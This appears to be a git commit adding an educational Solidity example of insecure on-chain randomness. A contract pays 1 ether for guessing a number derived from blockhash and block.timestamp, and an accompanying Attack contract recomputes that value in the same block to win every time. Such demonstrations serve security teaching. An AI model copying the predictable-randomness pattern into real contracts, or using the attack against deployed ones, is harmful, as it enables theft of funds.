7fb3dd9f97760474f769d4f732a39283dbad2d5c
prayas7102 <prayas.prithvirajpratap7@gmail.com>
2023-03-26 15:54:36 +0530

    Insecure_Randomness

---
+++ Insecure_Randomness/Insecure_Randomness.sol
@@ -0,0 +1,33 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8
+
+// both contracts are executed in the same block.
+// so both blockhash(block.number-1) & block.timestamp
+// will be the same in both contract
+
+contract GuessRandomNumber{
+    constructor(){}
+    function guess(uint _guess) public {
+
+        // blockhash(block.number-1) this returns hash of previous block
+        uint ans=uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
+        if(_guess==ans){
+            (bool sent,)=msg.sender.call{value: 1 ether}("");
+            require(sent, "Failed to send ether");
+        }
+    }
+}
+
+contract Attack{
+    function attack(GuessRandomNumber guessRandomNumber) public {
+        uint ans=uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
+        guessRandomNumber.guess(ans);
+    }
+    
+    function getBalance() public view returns(uint){
+        return address(this).balance;
+    }
+    
+    receive() external payable {}
+    
+}
